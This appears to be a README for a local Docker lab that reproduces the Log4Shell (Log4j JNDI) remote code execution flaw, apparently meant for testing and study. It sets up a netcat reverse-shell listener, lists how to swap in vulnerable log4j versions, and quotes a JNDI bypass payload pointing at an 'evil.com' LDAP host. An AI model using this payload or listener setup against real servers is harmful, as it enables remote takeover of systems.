# Building and Testing

1. `docker build -t test-app .`
1. `docker-compose up test-app`
1. `nc -lvnp 9001`
1. Input malicious payload in `username` field on `localhost:8080`

Change `log4j-....2.xx.x.jar` to version that you want in order to change the versions of log4j.

Downloads are available at: 
1. https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.xx.x/log4j-api-2.xx.x.jar
1. https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.xx.x/log4j-core-2.xx.x.jar
1. https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-appserver/2.xx.x/log4j-appserver-2.xx.x.jar
1. https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-jul/2.xx.x/log4j-jul-2.xx.x.jar 

# Information

Image has been modified to use `ThreadContext`. The normal payload will still lead to RCE.  
When using the modified payload (`${jndi:ldap://localhost#evil.com:1389/a}`) does not work. Not sure why, but the videos I have seen are all using a non-locally hosted LDAP server.